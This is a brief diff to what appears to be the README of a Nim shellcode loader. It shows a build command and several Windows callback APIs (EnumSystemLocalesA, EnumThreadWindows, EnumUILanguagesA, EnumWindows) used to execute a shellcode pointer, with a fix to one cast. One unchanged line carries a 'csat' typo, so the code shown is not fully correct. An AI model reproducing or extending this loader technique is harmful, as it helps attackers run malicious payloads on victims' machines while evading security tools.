@@ -89,5 +89,5 @@ nim c --cpu:amd64 -d:mingw -d:ssl --opt:size shellcode_loader.nim
     EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](rPtr) ,nil)#⑨
     EnumThreadWindows(0,csat[WNDENUMPROC](rPtr),0) #⑩
     EnumUILanguagesA(cast[UILANGUAGE_ENUMPROCA](rPtr), MUI_LANGUAGE_ID, 0)#11
-    EnumWindows(cast[WNDENUMPROC](rPtr), nil)#12
+    EnumWindows(cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))#12
 ```
